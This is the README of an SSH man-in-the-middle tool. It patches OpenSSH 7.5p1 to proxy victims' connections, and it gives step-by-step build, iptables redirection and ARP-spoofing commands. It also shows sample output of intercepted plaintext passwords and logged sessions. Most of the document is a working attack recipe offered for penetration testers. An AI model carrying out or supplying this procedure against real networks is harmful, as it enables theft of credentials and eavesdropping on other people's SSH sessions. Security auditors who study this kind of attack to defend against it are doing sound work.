# SSH MITM v1.0

## Overview

This penetration testing tool allows an auditor to intercept SSH connections.  A patch applied to the OpenSSH v7.5p1 source code causes it to act as a proxy between the victim and their intended SSH server; all plaintext passwords and sessions are logged to disk.

Of course, the victim's SSH client will complain that the server's key has changed.  But because 99.99999% of the time this is caused by a legitimate action (OS re-install, configuration change, etc), many/most users will disregard the warning and continue on.

**NOTE:** Only run the modified *sshd* in a VM or container!  Ad-hoc edits were made to the OpenSSH sources in critical regions, with no regard to their security implications.  Its not hard to imagine these edits introduce serious vulnerabilities.  Until the dependency on root privileges is removed, be sure to only run this code on throw-away VMs/containers.


## To Do

This is the first release of this tool.  While it is very useful as-is, there are nevertheless things to improve:

* Support SFTP MITM'ing.
* Add port forwarding support.
* Remove dependency on root privileges.
* Create wrapper script that detects when user is trying to use key authentication only, and de-spoof them automatically.


## Initial Setup

1.) Install zlib and openssl headers:

    sudo apt install zlib1g-dev libssl-dev

2.) Download OpenSSH v7.5p1 and verify its signature:

    wget https://ftp.openbsd.org/pub/OpenBSD/OpenSSH/RELEASE_KEY.asc
    wget https://ftp.openbsd.org/pub/OpenBSD/OpenSSH/portable/openssh-7.5p1.tar.gz
    wget https://ftp.openbsd.org/pub/OpenBSD/OpenSSH/portable/openssh-7.5p1.tar.gz.asc
    gpg --import RELEASE_KEY.asc
    gpg --verify openssh-7.5p1.tar.gz.asc openssh-7.5p1.tar.gz

3.) Unpack the tarball, patch the sources, and compile it:

    tar xzf openssh-7.5p1.tar.gz
    patch -p0 < openssh-7.5p1-mitm.patch
    mv openssh-7.5p1 openssh-7.5p1-mitm; cd openssh-7.5p1-mitm; ./configure --with-sandbox=no && make -j 10

4.) Create keys and setup environment:

    sudo ssh-keygen -t ed25519 -f /usr/local/etc/ssh_host_ed25519_key < /dev/null
    sudo ssh-keygen -t rsa -b 4096 -f /usr/local/etc/ssh_host_rsa_key < /dev/null
    sudo useradd -m sshd && sudo useradd -m bogus && sudo chmod 0700 ~sshd ~bogus
    sudo mkdir /var/empty; sudo cp ssh ~bogus/


## Running The Attack

1.) Run *sshd*:

    cd /path/to/openssh-7.5p1-mitm
    sudo $PWD/sshd -f $PWD/sshd_config

2.) Enable IP forwarding:

    sudo bash -c "echo 1 > /proc/sys/net/ipv4/ip_forward"
    sudo iptables -P FORWARD ACCEPT

3.) Allow connections to *sshd* and re-route forwarded SSH connections:

    sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT
    sudo iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-ports 22

4.) ARP spoof a target(s) (**Protip:** do NOT spoof all the things!  Your puny network interface won't likely be able to handle an entire network's traffic all at once.  Only spoof a couple IPs at a time):

    arpspoof -r -t 192.168.x.1 192.168.x.5

5.) Monitor *auth.log*.  Intercepted passwords will appear here:

    sudo tail -f /var/log/auth.log

6.) Once a session is established, a full log of all input & output can be found in */home/bogus/session_\*.txt*.


## Sample Results

Upon success, */var/log/auth.log* will have lines that log the password, like this:

    May 16 23:14:01 showmeyourmoves sshd[16798]: INTERCEPTED PASSWORD: hostname: [10.199.30.x]; username: [jdog]; password: [supercalifragilistic] [preauth]

Furthermore, the victim's entire SSH session can be found in */home/bogus/session_\*.txt*:

    # cat /home/bogus/session_0.txt
    Last login: Tue May 16 21:35:00 2017 from 10.50.22.x
    OpenBSD 6.0-stable (GENERIC.MP) #12: Sat May  6 19:08:31 EDT 2017

    Welcome to OpenBSD: The proactively secure Unix-like operating system.

    Please use the sendbug(1) utility to report bugs in the system.
    Before reporting a bug, please try to reproduce it with the latest
    version of the code.  With bug reports, please try to ensure that
    enough information to reproduce the problem is enclosed, and if a
    known fix for it exists, include that as well.

    jdog@jefferson ~ $ ppss
      PID TT  STAT       TIME COMMAND
    59264 p0  Ss      0:00.02 -bash (bash)
    52132 p0  R+p     0:00.00 ps
    jdog@jefferson ~ $ iidd
    uid=1000(jdog) gid=1000(jdog) groups=1000(jdog), 0(wheel)
    jdog@jefferson ~ $ sssshh  jjtteessttaa@@mmaaggiiccbbooxx
    jtesta@magicbox's password: ROFLC0PTER!!1juan


Note that the characters in the user's commands appear twice in the file because the input from the user is recorded, as well as the output from the shell (which echoes characters back).  Observe that when programs like sudo and ssh temporarily disable echoing in order to read a password, duplicate characters are not logged.


## Developer Documentation

In *lol.h* are two defines: *DEBUG_HOST* and *DEBUG_PORT*.  Enable them and set the hostname to a test server.  Now you can connect to *sshd* directly without using ARP spoofing in order to test your changes, e.g.:

    ssh valid_user_on_debug_host@localhost

To create a new patch, use these commands:

    pushd openssh-7.5p1-mitm/; make clean; popd
    diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh openssh-7.5p1 openssh-7.5p1-mitm/ > openssh-7.5p1-mitm.patch
